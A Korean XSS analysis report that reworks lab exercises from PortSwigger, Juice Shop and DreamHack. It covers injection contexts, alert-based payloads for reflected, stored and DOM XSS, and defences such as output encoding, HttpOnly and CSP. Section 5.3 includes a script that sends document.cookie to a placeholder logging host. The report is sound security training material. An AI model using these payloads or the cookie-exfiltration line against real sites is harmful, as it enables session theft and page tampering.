# 취약점 분석 보고서 - Cross-Site Scripting (XSS)

## 1. 개요

웹 애플리케이션의 검색, 댓글, 클라이언트 사이드 렌더링 지점에서 XSS(Cross-Site Scripting) 가능성을 분석했다. 단순히 `<script>alert(1)</script>` 실행 여부만 보는 것이 아니라, 입력값이 HTML 본문, HTML 속성, DOM sink 중 어느 문맥에 삽입되는지 확인하고 각 문맥에 맞는 탈출 방법을 검증했다.

이 보고서는 PortSwigger XSS 실습, OWASP Juice Shop 실습, DreamHack XSS 풀이에서 반복적으로 사용한 분석 루틴을 제출용 보고서 형식으로 재구성한 것이다.

## 2. 대상 / 환경

| 항목 | 내용 |
| --- | --- |
| 대상 | 실습용 웹 애플리케이션 |
| 취약 유형 | Reflected XSS, Stored XSS, DOM XSS |
| 주요 입력 지점 | 검색 파라미터, 댓글 입력, URL query, 헤더/트래킹 파라미터 |
| 주요 문맥 | HTML body, HTML attribute, `document.write()` sink |
| 검증 도구 | Browser DevTools, Burp Suite Repeater, webhook 테스트 서버 |

## 3. 분석 목적

- 사용자 입력이 어느 HTML/DOM 문맥에 반영되는지 분류한다.
- Reflected, Stored, DOM XSS의 차이와 영향 범위를 구분한다.
- 세션 쿠키 탈취, 페이지 변조, 피싱 폼 삽입 가능성을 영향도 관점에서 정리한다.
- 출력 인코딩, CSP, HttpOnly, CSRF 토큰 같은 방어책의 역할을 구분한다.

## 4. 입력 지점 및 문맥 분석

### 4.1 Reflected XSS - HTML 본문 문맥

```text
입력: GET /search?q=<user_input>
출력: <div class="result">검색어: <user_input></div>
문맥: HTML body
```

입력값이 별도 인코딩 없이 HTML 본문에 삽입되는 경우 브라우저가 입력을 마크업으로 해석한다. 이 문맥에서는 기본 스크립트 태그나 이벤트 핸들러 기반 페이로드로 실행 여부를 확인할 수 있다.

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

OWASP Juice Shop 실습에서는 검색 파라미터가 클라이언트 렌더링 경로에서 해석되며 alert가 실행되는 것을 확인했다.

![검색 파라미터 기반 XSS 실행](assets/reports/xss-juice-shop/01-dom-xss-search-alert.png)

이 캡처는 “payload가 입력됐다”가 아니라, URL query에 들어간 값이 브라우저에서 실행 가능한 HTML/JavaScript 문맥으로 해석됐다는 점을 보여준다.

### 4.2 Stored XSS - 댓글 저장 문맥

```text
입력: POST /comment
출력: 게시글 상세 페이지의 댓글 영역
문맥: DB 저장 후 HTML body에 재출력
```

Stored XSS는 페이로드가 서버 저장소에 남기 때문에 피해자가 링크를 직접 클릭하지 않아도 페이지 조회만으로 실행된다. 관리자나 운영자가 확인하는 댓글/문의/신고 기능에서 발생하면 계정 탈취와 관리자 기능 오용으로 이어질 수 있다.

Juice Shop 실습에서는 `True-Client-IP` 헤더 값이 Last Login IP 화면에 저장/출력되는 흐름을 확인했다. Burp에서 헤더 값을 조작해 payload를 삽입하고, 이후 해당 값이 페이지에서 다시 렌더링되는지 확인했다.

![True-Client-IP 헤더에 XSS payload 삽입](assets/reports/xss-juice-shop/02-stored-xss-header-payload.png)

현재 보유한 캡처는 True-Client-IP 헤더 입력을 보여준다. 저장 후 브라우저 실행과 다른 사용자에게 미치는 영향은 이 캡처만으로 확정하지 않는다. 저장형 XSS를 검증하려면 저장 요청과 이후 조회·실행 증거를 연결해야 한다.

![Stored XSS 헤더 캡처 실행 증거와 구분](assets/reports/xss-juice-shop/03-stored-xss-execution.png)

### 4.3 DOM XSS - `document.write()` + URL query

실습 중 확인한 DOM XSS 패턴은 서버 응답보다 브라우저 JavaScript의 DOM 조작이 핵심이었다.

```javascript
function trackSearch(query) {
  document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
}

const query = new URLSearchParams(location.search).get('search');
if (query) {
  trackSearch(query);
}
```

입력값이 `<img>`의 `src` 속성 안에 들어가므로 먼저 속성을 닫고, 기존 태그를 탈출한 뒤, 이벤트 핸들러가 있는 새 태그를 삽입한다.

```html
"><svg onload=alert(1)>
```

렌더링 관점에서 보면 입력은 다음처럼 해석된다.

```html
<!-- Before -->
<img src="/tracker.gif?searchTerms=FUZZ">

<!-- After -->
<img src="/tracker.gif?searchTerms="><svg onload=alert(1)>">
```

### 4.4 DOM XSS - `<select>` / `<option>` 탈출

다른 실습에서는 `storeId` 값이 `<option>` 태그 내부에 삽입됐다.

```javascript
document.write('<select name="storeId">');
if (store) {
  document.write('<option selected>' + store + '</option>');
}
```

이 경우에는 현재 option과 select 태그를 순서대로 닫은 뒤 새 HTML 태그를 삽입한다.

```text
?productId=4&storeId=</option></select><img src=x onerror=alert(1)>
```

이 사례는 XSS 분석에서 “payload를 외우는 것”보다 “입력값이 들어가는 문맥을 먼저 보는 것”이 중요하다는 점을 보여준다.

## 5. 재현 절차

### 5.1 Reflected XSS

```text
1. 검색 파라미터에 일반 문자열을 넣고 반영 위치를 확인한다.
2. HTML 본문에 그대로 출력되는지 DevTools Elements 탭에서 확인한다.
3. <script>alert(1)</script> 또는 <img src=x onerror=alert(1)> 로 실행 여부를 확인한다.
4. URL 인코딩 후에도 동일하게 실행되는지 확인한다.
```

### 5.2 Stored XSS

```text
1. 댓글/게시글/문의 입력란에 테스트 페이로드를 저장한다.
2. 다른 브라우저 세션 또는 관리자 관점에서 해당 페이지를 조회한다.
3. 조회 시점에 payload가 자동 실행되는지 확인한다.
4. 저장된 payload가 목록, 상세, 관리자 페이지 중 어디에서 실행되는지 범위를 분리한다.
```

### 5.3 세션 영향 검증

세션 쿠키가 `HttpOnly` 없이 설정된 경우 JavaScript에서 `document.cookie` 접근이 가능하다. 아래 코드는 본인 통제 테스트 서버에서 세션 영향을 확인하는 설명용 예시다. 현재 공개 캡처만으로 쿠키 수신까지 검증됐다고 주장하지 않는다.

```html
<script>
new Image().src = "https://example.test/log?c=" + encodeURIComponent(document.cookie);
</script>
```

제출용 보고서에서는 실제 수신 URL, 쿠키 값, 세션 식별자는 모두 익명화한다.

## 6. 영향도

| 구분 | 영향 |
| --- | --- |
| 기밀성 | 세션 쿠키, CSRF 토큰, 화면 내 민감 정보 탈취 가능 |
| 무결성 | DOM 변조, 피싱 폼 삽입, 사용자 액션 유도 가능 |
| 가용성 | 악성 리다이렉트, 무한 alert, 페이지 기능 방해 가능 |
| 범위 | Reflected는 링크 클릭 사용자, Stored는 페이지 방문자 전체, DOM은 클라이언트 렌더링 경로 영향 |
| 위험도 | Stored XSS와 관리자 확인 페이지 XSS는 High로 평가 가능 |

## 7. 대응 방안

### 7.1 문맥별 출력 인코딩

```php
echo htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
```

- HTML body: `<`, `>`, `&`, `"`, `'` 인코딩
- HTML attribute: 따옴표 포함 인코딩
- JavaScript string: JS string escape 적용
- URL: URL encoding 적용

### 7.2 쿠키 보안 속성

```http
Set-Cookie: session=<value>; HttpOnly; Secure; SameSite=Lax
```

`HttpOnly`는 쿠키 탈취를 줄이지만 XSS 자체를 제거하지는 못한다. DOM 변조, 피싱, 사용자 대리 요청은 여전히 가능하므로 출력 인코딩과 함께 적용해야 한다.

### 7.3 CSP 적용

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'
```

CSP는 피해를 줄이는 보조 방어책이다. `unsafe-inline` 또는 과도하게 넓은 외부 도메인을 허용하면 효과가 크게 약해진다.

## 8. 학습한 점

- XSS는 payload 암기가 아니라 입력값이 들어가는 문맥 분석이 핵심이다.
- DOM XSS는 서버 응답에서 payload가 보이지 않아도 브라우저 JavaScript sink에서 발생할 수 있다.
- Stored XSS는 운영자/관리자 확인 흐름과 결합될 때 영향도가 크게 올라간다.
- `HttpOnly`, CSP, CSRF 토큰은 각각 막는 범위가 다르므로 한 가지 방어책만으로 충분하지 않다.
